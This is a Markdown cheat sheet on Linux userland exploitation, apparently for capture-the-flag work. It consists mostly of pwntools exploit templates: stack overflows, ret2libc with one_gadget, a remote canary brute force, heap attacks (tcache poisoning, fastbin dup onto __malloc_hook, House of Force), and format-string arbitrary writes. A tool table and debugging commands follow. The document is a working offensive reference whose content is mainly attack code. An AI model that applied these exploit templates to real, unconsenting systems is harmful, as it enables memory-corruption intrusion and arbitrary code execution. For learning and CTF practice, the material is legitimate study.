# Linux Userland Exploitation

## Stack Buffer Overflow

### Classic Stack Smash (No Mitigations)
```python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# Find offset to RIP
offset = cyclic_find(p.corefile.fault_addr)

# Build payload
payload = b'A' * offset
payload += p64(elf.symbols['win'])  # or shellcode address
p.sendline(payload)
p.interactive()
```

### With NX + ASLR (ret2libc / one_gadget)
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

# Stage 1: Leak libc address
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # return to main for stage 2

payload = b'A' * offset + rop.chain()
p.sendline(payload)

# Parse leak
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: one_gadget or system("/bin/sh")
# one_gadget ./libc.so.6
one_gadget = libc.address + 0xdeadbeef  # from one_gadget output
payload2 = b'A' * offset + p64(one_gadget)
p.sendline(payload2)
p.interactive()
```

### With Stack Canary
```python
# Leak canary via format string or byte-by-byte brute force (forking server)
# Canary is at [rbp-8] on x86_64, always starts with \x00

# Byte-by-byte brute force (forking server only)
canary = b'\x00'
for i in range(7):
    for byte in range(256):
        p = remote('target', 1337)
        payload = b'A' * canary_offset + canary + bytes([byte])
        p.send(payload)
        response = p.recvall(timeout=1)
        if b"normal response" in response:  # didn't crash
            canary += bytes([byte])
            break
        p.close()
```

## Heap Exploitation (glibc ptmalloc2)

### Tcache Poisoning (glibc 2.26+)
```python
# Tcache is per-thread, LIFO, no integrity checks (pre-2.32)
# Double-free into tcache → overwrite fd → allocate at arbitrary address

# 1. Allocate and free twice (tcache allows double-free pre-2.32)
alloc(0, 0x20, b'AAAA')
free(0)
free(0)  # double-free: tcache[0x30] → chunk → chunk → chunk (cycle)

# 2. Overwrite fd pointer to target
alloc(1, 0x20, p64(target_addr))  # chunk.fd = target

# 3. Drain tcache
alloc(2, 0x20, b'BBBB')  # gets the original chunk
alloc(3, 0x20, b'CCCC')  # gets chunk at target_addr (arbitrary write!)
```

### Tcache Poisoning (glibc 2.32+ with safe-linking)
```python
# Safe-linking: fd is mangled with (heap_base >> 12) XOR
# Need heap leak first to demangle/mangle pointers

def mangle(ptr, pos):
    return ptr ^ (pos >> 12)

def demangle(mangled, pos):
    return mangled ^ (pos >> 12)

# After leaking heap base:
fake_fd = mangle(target_addr, chunk_addr)
alloc(1, 0x20, p64(fake_fd))
```

### Fastbin Attack (glibc < 2.26 or large tcache bypass)
```python
# Fastbin requires valid size field at target address
# Find a location with a valid-looking size (0x7f from misaligned read)

# Classic: __malloc_hook overwrite
# 0x7f appears naturally near __malloc_hook due to libc addresses
malloc_hook = libc.symbols['__malloc_hook']
fake_chunk = malloc_hook - 0x23  # 0x7f size field at offset

free(0); free(1); free(0)  # fastbin dup
alloc(2, 0x60, p64(fake_chunk))
alloc(3, 0x60, b'A')
alloc(4, 0x60, b'A')
alloc(5, 0x60, b'\x00' * 0x13 + p64(one_gadget))  # overwrite __malloc_hook
```

### Unsorted Bin Attack (libc leak)
```python
# Free a chunk into unsorted bin (size > tcache max, or tcache full)
# fd and bk point to main_arena+offset → leak libc

alloc(0, 0x420, b'A' * 0x420)  # large enough to skip tcache
alloc(1, 0x20, b'B' * 0x20)    # prevent consolidation with top
free(0)

# Read freed chunk's fd/bk → contains main_arena pointer
# main_arena is at known offset from libc base
leak = show(0)  # however you read freed chunk data
libc_base = u64(leak[:8]) - 0x1ecbe0  # offset varies by libc version
```

### House of Force (top chunk overwrite)
```python
# Overwrite top chunk size to 0xffffffffffffffff
# Then malloc(target - top - header) to move top chunk to target
# Next allocation lands at target

# Requires: heap overflow into top chunk size field
overflow(top_chunk_size_addr, p64(0xffffffffffffffff))

# Calculate distance
distance = target_addr - top_chunk_addr - 0x20  # adjust for headers
alloc(size=distance)  # moves top chunk
alloc(size=0x20)      # this allocation is at target_addr
```

## Format String Exploitation

### Read Stack / Leak Addresses
```python
# %p leak (positional)
payload = b'%1$p.%2$p.%3$p.%4$p.%5$p.%6$p'
# Find your input on stack
payload = b'AAAAAAAA' + b'%7$p'  # if input starts at offset 7
# Leak canary, libc, PIE addresses from known stack positions
```

### Arbitrary Write (%n)
```python
# Write 4 bytes at a time using %hn (2 bytes) or %hhn (1 byte)
# Target: GOT entry, return address, __malloc_hook

target = elf.got['printf']  # overwrite printf GOT with system
value = libc.symbols['system']

# Write low 2 bytes
writes = {target: value & 0xffff, target+2: (value >> 16) & 0xffff}
payload = fmtstr_payload(offset, writes, numbwritten=0)
```

### pwntools Format String Helper
```python
from pwn import *

# Automatic format string exploitation
def exec_fmt(payload):
    p = process('./vuln')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
# autofmt.offset is the format string offset
# autofmt.write(addr, value) generates the payload
```

## Tools

| Tool | Purpose |
|------|---------|
| pwntools | Exploit development framework (Python) |
| one_gadget | Find execve gadgets in libc |
| ROPgadget / ropper | ROP gadget finder |
| patchelf | Change binary's libc/linker for local testing |
| pwninit | Auto-setup challenge environment (libc, linker) |
| GEF / pwndbg | GDB extensions for exploit dev |
| heap-analysis (GEF) | Visualize heap state |
| checksec | Check binary mitigations |
| seccomp-tools | Dump seccomp filter rules |
| libc-database | Identify libc version from leaked symbols |

## Debugging Tips

```bash
# Run with specific libc
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

# GDB with pwntools
p = gdb.debug('./vuln', 'b *main+42\nc')

# Heap inspection (GEF)
# gef> heap bins
# gef> heap chunks
# gef> heap arenas

# Find one_gadget constraints
one_gadget ./libc.so.6
# Check which constraints are satisfiable at your call site
```
